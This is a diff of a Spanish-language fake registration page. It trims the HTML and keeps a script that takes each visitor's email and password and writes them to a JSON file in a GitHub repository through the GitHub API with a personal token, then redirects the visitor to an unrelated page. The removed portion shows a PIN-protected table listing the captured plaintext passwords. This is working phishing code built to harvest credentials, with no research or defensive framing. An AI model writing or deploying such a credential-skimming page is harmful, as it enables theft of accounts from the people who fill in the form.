@@ -1,60 +1,3 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Registro y Recuperación</title>
-<style>
-body { margin: 0; font-family: Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa, #c3cfe2); display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
-.login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; margin-bottom: 20px; }
-.login-box h2 { margin-bottom: 5px; }
-.login-box p { margin-top: 0; color: #666; font-size: 14px; }
-.login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; }
-.login-box button { width: 100%; padding: 12px; background: #4285F4; border: none; border-radius: 10px; color: white; cursor: pointer; margin-top: 10px; }
-.extra { margin-top: 15px; font-size: 13px; color: #666; }
-.extra a { color: #4285F4; text-decoration: none; cursor: pointer; }
-.extra a:hover { text-decoration: underline; }
-
-/* Tabla estilo Excel */
-#historialContainer { display: none; margin-top: 20px; width: 90%; max-width: 800px; overflow-x: auto; }
-#historialContainer table { width: 100%; border-collapse: collapse; }
-#historialContainer th, #historialContainer td { border: 1px solid #ccc; padding: 10px; text-align: left; }
-#historialContainer th { background: #4285F4; color: white; }
-#historialContainer tr:nth-child(even) { background: #f0f0f0; }
-</style>
-</head>
-<body>
-
-<div class="login-box">
-  <h2>Regístrate</h2>
-  <p>Bienvenido, ingresa tus datos</p>
-  <form id="loginForm">
-    <input type="email" name="email" placeholder="Correo electrónico" required>
-    <input type="password" name="password" placeholder="Contraseña" required>
-    <button type="submit">Ingresar</button>
-  </form>
-
-  <div class="extra">
-    <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
-  </div>
-</div>
-
-<!-- Contenedor oculto para historial tipo Excel -->
-<div id="historialContainer">
-  <h2>Historial de Datos Registrados</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>Correo</th>
-        <th>Contraseña</th>
-        <th>Fecha</th>
-      </tr>
-    </thead>
-    <tbody id="historialTableBody"></tbody>
-  </table>
-</div>
-
 <script>
 // Configuración GitHub
 const token = 'TU_TOKEN_AQUI'; // Tu token personal de GitHub
@@ -63,21 +6,15 @@ const repo = 'NOMBRE_REPO';
 const path = 'datos.json';
 
 const loginForm = document.getElementById('loginForm');
-const recoverLink = document.getElementById('recoverLink');
-const historialContainer = document.getElementById('historialContainer');
-const historialTableBody = document.getElementById('historialTableBody');
 
 // Función para guardar datos en GitHub
 async function guardarDatosGitHub(email, password) {
-  // Obtener contenido actual del JSON
   const res = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`);
   const data = await res.json();
   const contenido = JSON.parse(atob(data.content));
 
-  // Agregar nuevo registro
   contenido.push({ email, password, fecha: new Date().toLocaleString() });
 
-  // Subir archivo actualizado
   await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
     method: 'PUT',
     headers: {
@@ -98,42 +35,13 @@ loginForm.addEventListener('submit', function(e){
   const email = this.email.value;
   const password = this.password.value;
 
+  // Guardar en GitHub y luego redirigir
   guardarDatosGitHub(email, password)
     .then(() => {
-      alert("Datos guardados ✅");
+      // Redirigir al enlace que tenías
       window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
     })
     .catch(err => console.error(err));
 });
-
-// Mostrar historial con PIN
-recoverLink.addEventListener('click', async function(){
-  const pin = prompt("Ingresa el PIN para acceder a los datos:");
-
-  if(pin === "2006"){
-    const res = await fetch(`https://raw.githubusercontent.com/${owner}/${repo}/main/${path}`);
-    const datos = await res.json();
-
-    historialTableBody.innerHTML = "";
-    datos.forEach((dato, index) => {
-      const tr = document.createElement('tr');
-      tr.innerHTML = `
-        <td>${index + 1}</td>
-        <td>${dato.email}</td>
-        <td>${dato.password}</td>
-        <td>${dato.fecha}</td>
-      `;
-      historialTableBody.appendChild(tr);
-    });
-
-    historialContainer.style.display = "block";
-    historialContainer.scrollIntoView({ behavior: 'smooth' });
-  } else {
-    alert("PIN incorrecto ❌");
-  }
-});
 </script>
-
-</body>
-</html>
 
